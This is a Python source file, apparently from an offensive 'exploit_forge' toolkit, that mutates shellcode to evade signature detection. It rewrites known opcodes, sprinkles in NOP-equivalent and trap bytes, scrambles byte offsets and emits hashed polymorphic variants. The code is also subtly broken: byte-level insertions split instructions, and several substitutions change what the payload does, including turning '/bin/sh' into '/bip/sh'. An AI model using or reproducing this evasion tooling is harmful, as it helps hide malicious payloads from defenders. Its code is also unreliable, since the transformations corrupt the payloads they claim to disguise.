# forgemind-core/exploit_forge/signature_blender.py

import random
import re
import hashlib
import logging
from typing import List, Tuple, Dict

logger = logging.getLogger("signature_blender")
logger.setLevel(logging.DEBUG)

NOP_EQUIVALENTS = [
    b"\x90",             # x86 NOP
    b"\x89\xC0",         # mov eax,eax
    b"\x87\xDB",         # xchg ebx,ebx
    b"\x8D\x76\x00",     # lea esi,[esi+0]
    b"\x66\x90"          # 2-byte NOP
]

ANTI_PATTERN_INSERTIONS = [
    b"\xCC",  # int3 (debug trap)
    b"\xF4",  # hlt
    b"\xEB\x00",  # jmp +0
    b"\x00",  # null padding
]

SIGNATURE_MAP = {
    b"\x31\xC0": b"\x31\xD2",  # xor eax,eax → xor edx,edx
    b"\xCD\x80": b"\x0F\x05",  # int 0x80 → syscall
    b"/bin/sh": b"/bip/sh",
}

class SignatureBlender:
    def __init__(self):
        self.rules = SIGNATURE_MAP.copy()

    def apply_transformations(self, blob: bytes) -> bytes:
        blob = self._replace_known_patterns(blob)
        blob = self._inject_nop_noise(blob)
        blob = self._insert_anti_signature_noise(blob)
        blob = self._scramble_known_offsets(blob)
        return blob

    def _replace_known_patterns(self, blob: bytes) -> bytes:
        for pattern, replacement in self.rules.items():
            if pattern in blob:
                blob = blob.replace(pattern, replacement)
                logger.debug(f"[BLENDER] pattern {pattern.hex()} → {replacement.hex()}")
        return blob

    def _inject_nop_noise(self, blob: bytes) -> bytes:
        mutated = bytearray()
        for b in blob:
            mutated.append(b)
            if random.random() < 0.07:
                nop = random.choice(NOP_EQUIVALENTS)
                mutated.extend(nop)
                logger.debug(f"[NOP] inserted {nop.hex()}")
        return bytes(mutated)

    def _insert_anti_signature_noise(self, blob: bytes) -> bytes:
        position = random.randint(0, len(blob)) if len(blob) > 0 else 0
        noise = random.choice(ANTI_PATTERN_INSERTIONS)
        result = blob[:position] + noise + blob[position:]
        logger.debug(f"[SCRAMBLE] inserted anti-pattern {noise.hex()} at offset {position}")
        return result

    def _scramble_known_offsets(self, blob: bytes) -> bytes:
        # Shuffle some known regions to invalidate offset-based detection
        length = len(blob)
        if length < 8:
            return blob

        index = random.randint(1, length - 3)
        window = blob[index:index+2]
        scrambled = window[::-1]
        logger.debug(f"[OFFSET] scramble [{index}:{index+2}] → {scrambled.hex()}")
        return blob[:index] + scrambled + blob[index+2:]

    def polymorphic_variants(self, blob: bytes, count: int = 5) -> List[Tuple[str, bytes]]:
        variants = []
        for _ in range(count):
            mutated = self.apply_transformations(blob)
            sig = hashlib.sha256(mutated).hexdigest()[:16]
            variants.append((sig, mutated))
            logger.info(f"[VARIANT] {sig}")
        return variants
